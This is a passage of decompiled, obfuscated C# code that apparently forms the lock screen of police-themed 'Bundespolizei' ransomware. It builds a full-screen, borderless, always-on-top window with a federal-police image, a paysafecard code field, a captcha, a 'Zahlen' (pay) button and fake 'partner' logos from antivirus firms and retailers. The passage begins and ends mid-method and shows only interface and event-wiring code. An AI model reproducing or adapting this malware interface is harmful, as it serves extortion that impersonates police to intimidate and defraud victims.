		Button obj63 = vmethod_24();
		location = new Point(293, 134);
		((Control)obj63).set_Location(location);
		((Control)vmethod_24()).set_Name("btnZahlen");
		Button obj64 = vmethod_24();
		size = new Size(75, 23);
		((Control)obj64).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(16);
		((ButtonBase)vmethod_24()).set_Text("Zahlen");
		((ButtonBase)vmethod_24()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_24()).set_Visible(false);
		PictureBox obj65 = vmethod_26();
		location = new Point(148, 106);
		((Control)obj65).set_Location(location);
		((Control)vmethod_26()).set_Name("pbCaptcha");
		PictureBox obj66 = vmethod_26();
		size = new Size(141, 44);
		((Control)obj66).set_Size(size);
		vmethod_26().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_26().set_TabIndex(15);
		vmethod_26().set_TabStop(false);
		vmethod_28().set_AutoSize(true);
		((Control)vmethod_28()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj67 = vmethod_28();
		location = new Point(92, 116);
		((Control)obj67).set_Location(location);
		((Control)vmethod_28()).set_Name("lblTextCaptcha");
		Label obj68 = vmethod_28();
		size = new Size(55, 15);
		((Control)obj68).set_Size(size);
		((Control)vmethod_28()).set_TabIndex(14);
		vmethod_28().set_Text("Captcha:");
		((Control)vmethod_28()).set_Visible(false);
		((Control)vmethod_30()).set_Enabled(false);
		Button obj69 = vmethod_30();
		location = new Point(368, 74);
		((Control)obj69).set_Location(location);
		((Control)vmethod_30()).set_Name("btnOk");
		Button obj70 = vmethod_30();
		size = new Size(37, 20);
		((Control)obj70).set_Size(size);
		((Control)vmethod_30()).set_TabIndex(13);
		((ButtonBase)vmethod_30()).set_Text("OK");
		((ButtonBase)vmethod_30()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_32()).set_Enabled(false);
		TextBox obj71 = vmethod_32();
		location = new Point(148, 74);
		((Control)obj71).set_Location(location);
		((Control)vmethod_32()).set_Name("txtPSC");
		TextBox obj72 = vmethod_32();
		size = new Size(218, 20);
		((Control)obj72).set_Size(size);
		((Control)vmethod_32()).set_TabIndex(12);
		vmethod_32().set_Text("Format: 0000-0000-0000-0000");
		((ButtonBase)vmethod_22()).set_AutoSize(true);
		RadioButton obj73 = vmethod_22();
		location = new Point(97, 38);
		((Control)obj73).set_Location(location);
		((Control)vmethod_22()).set_Name("rdbPaysafe");
		RadioButton obj74 = vmethod_22();
		size = new Size(14, 13);
		((Control)obj74).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(10);
		vmethod_22().set_TabStop(true);
		((ButtonBase)vmethod_22()).set_UseVisualStyleBackColor(true);
		vmethod_18().set_Image((Image)(object)Class19.smethod_14());
		PictureBox obj75 = vmethod_18();
		location = new Point(117, 21);
		((Control)obj75).set_Location(location);
		((Control)vmethod_18()).set_Name("pbPaysafecard");
		PictureBox obj76 = vmethod_18();
		size = new Size(288, 47);
		((Control)obj76).set_Size(size);
		vmethod_18().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_18().set_TabIndex(9);
		vmethod_18().set_TabStop(false);
		((Control)vmethod_88()).set_Anchor((AnchorStyles)10);
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_92());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_94());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_90());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_74());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_86());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_76());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_84());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_78());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_82());
		((Control)vmethod_88()).get_Controls().Add((Control)(object)vmethod_80());
		GroupBox obj77 = vmethod_88();
		location = new Point(954, 501);
		((Control)obj77).set_Location(location);
		((Control)vmethod_88()).set_Name("gbPartners");
		GroupBox obj78 = vmethod_88();
		size = new Size(413, 416);
		((Control)obj78).set_Size(size);
		((Control)vmethod_88()).set_TabIndex(32);
		vmethod_88().set_TabStop(false);
		vmethod_88().set_Text("In Zusammenarbeit mit:");
		((Control)vmethod_92()).set_Anchor((AnchorStyles)10);
		vmethod_92().set_Image((Image)(object)Class19.smethod_7());
		PictureBox obj79 = vmethod_92();
		location = new Point(297, 21);
		((Control)obj79).set_Location(location);
		((Control)vmethod_92()).set_Name("pbFSecure");
		PictureBox obj80 = vmethod_92();
		size = new Size(83, 91);
		((Control)obj80).set_Size(size);
		vmethod_92().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_92().set_TabIndex(34);
		vmethod_92().set_TabStop(false);
		((Control)vmethod_94()).set_Anchor((AnchorStyles)10);
		vmethod_94().set_Image((Image)(object)Class19.smethod_8());
		PictureBox obj81 = vmethod_94();
		location = new Point(162, 21);
		((Control)obj81).set_Location(location);
		((Control)vmethod_94()).set_Name("pbKaspersky");
		PictureBox obj82 = vmethod_94();
		size = new Size(83, 91);
		((Control)obj82).set_Size(size);
		vmethod_94().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_94().set_TabIndex(33);
		vmethod_94().set_TabStop(false);
		((Control)vmethod_90()).set_Anchor((AnchorStyles)10);
		vmethod_90().set_Image((Image)(object)Class19.smethod_3());
		PictureBox obj83 = vmethod_90();
		location = new Point(28, 21);
		((Control)obj83).set_Location(location);
		((Control)vmethod_90()).set_Name("pbAvira");
		PictureBox obj84 = vmethod_90();
		size = new Size(83, 91);
		((Control)obj84).set_Size(size);
		vmethod_90().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_90().set_TabIndex(32);
		vmethod_90().set_TabStop(false);
		((Control)vmethod_74()).set_Anchor((AnchorStyles)10);
		vmethod_74().set_Image((Image)(object)Class19.smethod_4());
		PictureBox obj85 = vmethod_74();
		location = new Point(162, 285);
		((Control)obj85).set_Location(location);
		((Control)vmethod_74()).set_Name("pbHAutomat");
		PictureBox obj86 = vmethod_74();
		size = new Size(81, 122);
		((Control)obj86).set_Size(size);
		vmethod_74().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_74().set_TabIndex(31);
		vmethod_74().set_TabStop(false);
		((Control)vmethod_86()).set_Anchor((AnchorStyles)10);
		vmethod_86().set_Image((Image)(object)Class19.smethod_17());
		PictureBox obj87 = vmethod_86();
		location = new Point(76, 154);
		((Control)obj87).set_Location(location);
		((Control)vmethod_86()).set_Name("pbRossmann");
		PictureBox obj88 = vmethod_86();
		size = new Size(254, 53);
		((Control)obj88).set_Size(size);
		vmethod_86().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_86().set_TabIndex(25);
		vmethod_86().set_TabStop(false);
		((Control)vmethod_76()).set_Anchor((AnchorStyles)10);
		vmethod_76().set_Image((Image)(object)Class19.smethod_13());
		PictureBox obj89 = vmethod_76();
		location = new Point(249, 285);
		((Control)obj89).set_Location(location);
		((Control)vmethod_76()).set_Name("pbOMV");
		PictureBox obj90 = vmethod_76();
		size = new Size(81, 66);
		((Control)obj90).set_Size(size);
		vmethod_76().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_76().set_TabIndex(30);
		vmethod_76().set_TabStop(false);
		((Control)vmethod_84()).set_Anchor((AnchorStyles)10);
		vmethod_84().set_Image((Image)(object)Class19.smethod_1());
		PictureBox obj91 = vmethod_84();
		location = new Point(76, 213);
		((Control)obj91).set_Location(location);
		((Control)vmethod_84()).set_Name("pbAgip");
		PictureBox obj92 = vmethod_84();
		size = new Size(81, 66);
		((Control)obj92).set_Size(size);
		vmethod_84().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_84().set_TabIndex(26);
		vmethod_84().set_TabStop(false);
		((Control)vmethod_78()).set_Anchor((AnchorStyles)10);
		vmethod_78().set_Image((Image)(object)Class19.smethod_10());
		PictureBox obj93 = vmethod_78();
		location = new Point(76, 285);
		((Control)obj93).set_Location(location);
		((Control)vmethod_78()).set_Name("pbNetto");
		PictureBox obj94 = vmethod_78();
		size = new Size(81, 66);
		((Control)obj94).set_Size(size);
		vmethod_78().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_78().set_TabIndex(29);
		vmethod_78().set_TabStop(false);
		((Control)vmethod_82()).set_Anchor((AnchorStyles)10);
		vmethod_82().set_Image((Image)(object)Class19.smethod_2());
		PictureBox obj95 = vmethod_82();
		location = new Point(162, 213);
		((Control)obj95).set_Location(location);
		((Control)vmethod_82()).set_Name("pbAral");
		PictureBox obj96 = vmethod_82();
		size = new Size(81, 66);
		((Control)obj96).set_Size(size);
		vmethod_82().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_82().set_TabIndex(27);
		vmethod_82().set_TabStop(false);
		((Control)vmethod_80()).set_Anchor((AnchorStyles)10);
		vmethod_80().set_Image((Image)(object)Class19.smethod_6());
		PictureBox obj97 = vmethod_80();
		location = new Point(249, 213);
		((Control)obj97).set_Location(location);
		((Control)vmethod_80()).set_Name("pbEsso");
		PictureBox obj98 = vmethod_80();
		size = new Size(81, 66);
		((Control)obj98).set_Size(size);
		vmethod_80().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_80().set_TabIndex(28);
		vmethod_80().set_TabStop(false);
		((Control)vmethod_100()).set_Anchor((AnchorStyles)6);
		((Control)vmethod_100()).get_Controls().Add((Control)(object)vmethod_102());
		GroupBox obj99 = vmethod_100();
		location = new Point(237, 501);
		((Control)obj99).set_Location(location);
		((Control)vmethod_100()).set_Name("gbPayInfo");
		GroupBox obj100 = vmethod_100();
		size = new Size(276, 416);
		((Control)obj100).set_Size(size);
		((Control)vmethod_100()).set_TabIndex(33);
		vmethod_100().set_TabStop(false);
		vmethod_100().set_Text("Zahlungsinformationen:");
		((Control)vmethod_100()).set_Visible(false);
		vmethod_102().set_Image((Image)(object)Class19.smethod_15());
		PictureBox obj101 = vmethod_102();
		location = new Point(70, 46);
		((Control)obj101).set_Location(location);
		((Control)vmethod_102()).set_Name("pbPayInfo");
		PictureBox obj102 = vmethod_102();
		size = new Size(141, 328);
		((Control)obj102).set_Size(size);
		vmethod_102().set_SizeMode((PictureBoxSizeMode)2);
		vmethod_102().set_TabIndex(0);
		vmethod_102().set_TabStop(false);
		vmethod_0().set_Image((Image)(object)Class19.smethod_5());
		PictureBox obj103 = vmethod_0();
		location = new Point(1, -2);
		((Control)obj103).set_Location(location);
		((Control)vmethod_0()).set_Name("pbBundespolizei");
		PictureBox obj104 = vmethod_0();
		size = new Size(426, 344);
		((Control)obj104).set_Size(size);
		vmethod_0().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_0().set_TabIndex(0);
		vmethod_0().set_TabStop(false);
		((Control)vmethod_104()).set_Anchor((AnchorStyles)10);
		((Control)vmethod_104()).get_Controls().Add((Control)(object)vmethod_108());
		((Control)vmethod_104()).get_Controls().Add((Control)(object)vmethod_12());
		GroupBox obj105 = vmethod_104();
		location = new Point(1373, 775);
		((Control)obj105).set_Location(location);
		((Control)vmethod_104()).set_Name("GroupBox1");
		GroupBox obj106 = vmethod_104();
		size = new Size(146, 142);
		((Control)obj106).set_Size(size);
		((Control)vmethod_104()).set_TabIndex(35);
		vmethod_104().set_TabStop(false);
		vmethod_104().set_Text("Status");
		((Control)vmethod_108()).set_Font(new Font("Microsoft Sans Serif", 7f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj107 = vmethod_108();
		location = new Point(13, 25);
		((Control)obj107).set_Location(location);
		((Control)vmethod_108()).set_Name("txtStatus");
		((TextBoxBase)vmethod_108()).set_ReadOnly(true);
		TextBox obj108 = vmethod_108();
		size = new Size(117, 18);
		((Control)obj108).set_Size(size);
		((Control)vmethod_108()).set_TabIndex(36);
		vmethod_108().set_Text("Warte...");
		vmethod_106().set_Interval(1000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Gray);
		size = new Size(1527, 925);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_100());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_88());
		((Control)this).get_Controls().Add((Control)(object)vmethod_104());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)vmethod_8()).EndInit();
		((Control)vmethod_20()).ResumeLayout(false);
		((Control)vmethod_20()).PerformLayout();
		((ISupportInitialize)vmethod_36()).EndInit();
		((ISupportInitialize)vmethod_26()).EndInit();
		((ISupportInitialize)vmethod_18()).EndInit();
		((Control)vmethod_88()).ResumeLayout(false);
		((ISupportInitialize)vmethod_92()).EndInit();
		((ISupportInitialize)vmethod_94()).EndInit();
		((ISupportInitialize)vmethod_90()).EndInit();
		((ISupportInitialize)vmethod_74()).EndInit();
		((ISupportInitialize)vmethod_86()).EndInit();
		((ISupportInitialize)vmethod_76()).EndInit();
		((ISupportInitialize)vmethod_84()).EndInit();
		((ISupportInitialize)vmethod_78()).EndInit();
		((ISupportInitialize)vmethod_82()).EndInit();
		((ISupportInitialize)vmethod_80()).EndInit();
		((Control)vmethod_100()).ResumeLayout(false);
		((Control)vmethod_100()).PerformLayout();
		((ISupportInitialize)vmethod_102()).EndInit();
		((ISupportInitialize)vmethod_0()).EndInit();
		((Control)vmethod_104()).ResumeLayout(false);
		((Control)vmethod_104()).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual PictureBox vmethod_0()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(PictureBox pictureBox_15)
	{
		pictureBox_0 = pictureBox_15;
	}

	[SpecialName]
	internal virtual Label vmethod_2()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Label label_16)
	{
		label_0 = label_16;
	}

	[SpecialName]
	internal virtual RichTextBox vmethod_4()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(RichTextBox richTextBox_2)
	{
		richTextBox_0 = richTextBox_2;
	}

	[SpecialName]
	internal virtual Label vmethod_6()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(Label label_16)
	{
		label_1 = label_16;
	}

	[SpecialName]
	internal virtual TrackBar vmethod_8()
	{
		return trackBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(TrackBar trackBar_1)
	{
		EventHandler eventHandler = method_0;
		if (trackBar_0 != null)
		{
			trackBar_0.remove_ValueChanged(eventHandler);
		}
		trackBar_0 = trackBar_1;
		if (trackBar_0 != null)
		{
			trackBar_0.add_ValueChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label label_16)
	{
		label_2 = label_16;
	}

	[SpecialName]
	internal virtual Label vmethod_12()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Label label_16)
	{
		label_3 = label_16;
	}

	[SpecialName]
	internal virtual RichTextBox vmethod_14()
	{
		return richTextBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(RichTextBox richTextBox_2)
	{
		richTextBox_1 = richTextBox_2;
	}

	[SpecialName]
	internal virtual Label vmethod_16()
	{
		return label_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_17(Label label_16)
	{
		label_4 = label_16;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_18()
	{
		return pictureBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_19(PictureBox pictureBox_15)
	{
		pictureBox_1 = pictureBox_15;
	}

	[SpecialName]
	internal virtual GroupBox vmethod_20()
	{
		return groupBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_21(GroupBox groupBox_4)
	{
		groupBox_0 = groupBox_4;
	}

	[SpecialName]
	internal virtual RadioButton vmethod_22()
	{
		return radioButton_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_23(RadioButton radioButton_2)
	{
		EventHandler eventHandler = method_1;
		if (radioButton_0 != null)
		{
			radioButton_0.remove_CheckedChanged(eventHandler);
		}
		radioButton_0 = radioButton_2;
		if (radioButton_0 != null)
		{
			radioButton_0.add_CheckedChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button vmethod_24()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_25(Button button_3)
	{
		EventHandler eventHandler = method_7;
		if (button_0 != null)
		{
			((Control)button_0).remove_Click(eventHandler);
		}
		button_0 = button_3;
		if (button_0 != null)
		{
			((Control)button_0).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox vmethod_26()
	{
		return pictureBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_27(PictureBox pictureBox_15)
	{
		pictureBox_2 = pictureBox_15;
	}

	[SpecialName]
	internal virtual Label vmethod_28()
	{
		return label_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_29(Label label_16)
	{
		label_5 = label_16;
	}

	[SpecialName]
	internal virtual Button vmethod_30()
	{
		return button_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_31(Button button_3)
	{
		EventHandler eventHandler = method_2;
		if (button_1 != null)
		{
			((Control)button_1).remove_Click(eventHandler);
		}
		button_1 = button_3;
		if (button_1 != null)
		{
			((Control)button_1).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_32()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_33(TextBox textBox_11)
	{
		EventHandler eventHandler = method_5;
		EventHandler eventHandler2 = method_4;
		if (textBox_0 != null)
		{
			((Control)textBox_0).remove_LostFocus(eventHandler);
			((Control)textBox_0).remove_GotFocus(eventHandler2);
		}
		textBox_0 = textBox_11;
		if (textBox_0 != null)
		{
			((Control)textBox_0).add_LostFocus(eventHandler);
			((Control)textBox_0).add_GotFocus(eventHandler2);
		}
	}

	[SpecialName]
	internal virtual Label vmethod_34()
	{
		return label_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_35(Label label_16)
	{
		label_6 = label_16;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_36()
	{
		return pictureBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_37(PictureBox pictureBox_15)
	{
		pictureBox_3 = pictureBox_15;
	}

	[SpecialName]
	internal virtual RadioButton vmethod_38()
	{
		return radioButton_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_39(RadioButton radioButton_2)
	{
		radioButton_1 = radioButton_2;
	}

	[SpecialName]
	internal virtual Label vmethod_40()
	{
		return label_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_41(Label label_16)
	{
		label_7 = label_16;
	}

	[SpecialName]
	internal virtual TextBox vmethod_42()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_43(TextBox textBox_11)
	{
		textBox_1 = textBox_11;
	}

	[SpecialName]
	internal virtual Label vmethod_44()
	{
		return label_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_45(Label label_16)
	{
		label_8 = label_16;
	}

	[SpecialName]
	internal virtual Label vmethod_46()
	{
		return label_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_47(Label label_16)
	{
		label_9 = label_16;
	}

	[SpecialName]
	internal virtual TextBox vmethod_48()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_49(TextBox textBox_11)
	{
		textBox_2 = textBox_11;
	}

	[SpecialName]
	internal virtual Label vmethod_50()
	{
		return label_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_51(Label label_16)
	{
		label_10 = label_16;
	}

	[SpecialName]
	internal virtual TextBox vmethod_52()
	{
		return textBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_53(TextBox textBox_11)
	{
		textBox_3 = textBox_11;
	}

	[SpecialName]
	internal virtual Label vmethod_54()
	{
		return label_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_55(Label label_16)
	{
		label_11 = label_16;
	}

	[SpecialName]
	internal virtual TextBox vmethod_56()
	{
		return textBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_57(TextBox textBox_11)
	{
		textBox_4 = textBox_11;
	}

	[SpecialName]
	internal virtual TextBox vmethod_58()
	{
		return textBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_59(TextBox textBox_11)
	{
		textBox_5 = textBox_11;
	}

	[SpecialName]
	internal virtual TextBox vmethod_60()
	{
		return textBox_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_61(TextBox textBox_11)
	{
		textBox_6 = textBox_11;
	}

	[SpecialName]
	internal virtual Label vmethod_62()
	{
		return label_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_63(Label label_16)
	{
		label_12 = label_16;
	}

	[SpecialName]
	internal virtual TextBox vmethod_64()
	{
		return textBox_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_65(TextBox textBox_11)
	{
		textBox_7 = textBox_11;
	}

	[SpecialName]
	internal virtual Label vmethod_66()
	{
		return label_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_67(Label label_16)
	{
		label_13 = label_16;
	}

	[SpecialName]
	internal virtual TextBox vmethod_68()
	{
		return textBox_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_69(TextBox textBox_11)
	{
		textBox_8 = textBox_11;
	}

	[SpecialName]
	internal virtual Label vmethod_70()
	{
		return label_14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_71(Label label_16)
	{
		label_14 = label_16;
	}

	[SpecialName]
	internal virtual Button vmethod_72()
	{
		return button_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_73(Button button_3)
	{
		button_2 = button_3;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_74()
	{
		return pictureBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_75(PictureBox pictureBox_15)
	{
		pictureBox_4 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_76()
	{
		return pictureBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_77(PictureBox pictureBox_15)
	{
		pictureBox_5 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_78()
	{
		return pictureBox_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_79(PictureBox pictureBox_15)
	{
		pictureBox_6 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_80()
	{
		return pictureBox_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_81(PictureBox pictureBox_15)
	{
		pictureBox_7 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_82()
	{
		return pictureBox_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_83(PictureBox pictureBox_15)
	{
		pictureBox_8 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_84()
	{
		return pictureBox_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_85(PictureBox pictureBox_15)
	{
		pictureBox_9 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_86()
	{
		return pictureBox_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_87(PictureBox pictureBox_15)
	{
		pictureBox_10 = pictureBox_15;
	}

	[SpecialName]
	internal virtual GroupBox vmethod_88()
	{
		return groupBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_89(GroupBox groupBox_4)
	{
		groupBox_1 = groupBox_4;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_90()
	{
		return pictureBox_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_91(PictureBox pictureBox_15)
	{
		pictureBox_11 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_92()
	{
		return pictureBox_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_93(PictureBox pictureBox_15)
	{
		pictureBox_12 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_94()
	{
		return pictureBox_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_95(PictureBox pictureBox_15)
	{
		pictureBox_13 = pictureBox_15;
	}

	[SpecialName]
	internal virtual Label vmethod_96()
	{
		return label_15;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_97(Label label_16)
	{
		label_15 = label_16;
	}

	[SpecialName]
	internal virtual TextBox vmethod_98()
	{
		return textBox_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_99(TextBox textBox_11)
	{
		EventHandler eventHandler = method_3;
		if (textBox_9 != null)
		{
			((Control)textBox_9).remove_TextChanged(eventHandler);
		}
		textBox_9 = textBox_11;
		if (textBox_9 != null)
		{
			((Control)textBox_9).add_TextChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual GroupBox vmethod_100()
	{
		return groupBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_101(GroupBox groupBox_4)
	{
		groupBox_2 = groupBox_4;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_102()
	{
		return pictureBox_14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_103(PictureBox pictureBox_15)
	{
		pictureBox_14 = pictureBox_15;
	}

	[SpecialName]
	internal virtual GroupBox vmethod_104()
	{
		return groupBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_105(GroupBox groupBox_4)
	{
		groupBox_3 = groupBox_4;
	}

	[SpecialName]
	internal virtual Timer vmethod_106()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_107(Timer timer_1)
	{
		EventHandler eventHandler = method_6;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_1;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_108()
	{
		return textBox_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_109(TextBox textBox_11)
	{
		textBox_10 = textBox_11;
	}

	private void method_0(object sender, EventArgs e)
	{
		((Form)this).set_Opacity((double)vmethod_8().get_Value() / 100.0);
	}

	private void method_1(object sender, EventArgs e)
	{
		if (vmethod_22().get_Checked())
		{
			((Control)vmethod_32()).set_Enabled(true);
			((Control)vmethod_30()).set_Enabled(true);
			((Control)vmethod_100()).set_Visible(true);
		}
		else
		{
			((Control)vmethod_32()).set_Enabled(false);
			((Control)vmethod_30()).set_Enabled(false);
